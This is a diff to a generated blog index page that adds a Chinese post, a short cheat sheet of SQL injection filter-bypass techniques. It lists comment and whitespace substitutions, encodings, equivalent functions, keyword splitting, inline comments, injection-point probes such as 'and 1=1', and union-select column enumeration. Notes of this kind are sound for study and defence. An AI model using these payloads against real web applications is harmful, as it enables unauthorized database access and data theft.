@@ -149,7 +149,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -185,6 +185,85 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/apple-touch-icon-next.png">
+      <meta itemprop="name" content="清者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | The future is promising">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">sql注入之bypass技巧</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-11 17:06:37 / 修改时间：18:00:02" itemprop="dateCreated datePublished" datetime="2023-01-11T17:06:37+08:00">2023-01-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="绕过常见方式"><a href="#绕过常见方式" class="headerlink" title="绕过常见方式"></a>绕过常见方式</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#,–,– -,–+,//,/**/,/<em>letmetest</em>/,;%00</p>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>可以代替空格的字符<br>/**/,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等<br>还可以使用<br>+,-,~,.等<br>例如:union+select+1,2</p>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>hex编码，URL编码，宽字节，Unicode编码(iis支持)<br>URL编码:%6f%72%20%31%3d%31(and 1=1)<br>Unicode编码:un%u0069on</p>
+<h3 id="等价字符以及等价函数"><a href="#等价字符以及等价函数" class="headerlink" title="等价字符以及等价函数"></a>等价字符以及等价函数</h3><p>and==&gt;&amp;&amp;<br>or==&gt;||<br>xor==&gt;^<br>not==&gt;!<br>hex(),bin()==&gt;ascii()<br>concat_ws()==&gt;group_concat()<br>sleep()==&gt;benchmark()<br>mid(),substr()==&gt;substring()<br>@@user==&gt;user()<br>@@datadir==&gt;datadir()</p>
+<h3 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h3><p>mysql中=为等于的意思,只有在update中是赋值<br>:=  赋值<br>@   @加变量名可以直接调用</p>
+<h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><p>se’+’le’+’ct’<br>%S%E%L%E%C%T1<br>U/**/NION</p>
+<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>/<em>!Unlon</em>/</p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>and 1=1,and ‘a’=’a’,and 1(and 0),and hex(1),and hex(0),and !,/<em>!1</em>/,/<em>!0</em>/,and–+a%0a1/<em>!=</em>/0</p>
+<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p>order by 20 (后面加数字)</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>union select 1,2,3,……,得到的列数<br>之后便可以替换掉其中的数字来获取想要的信息</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
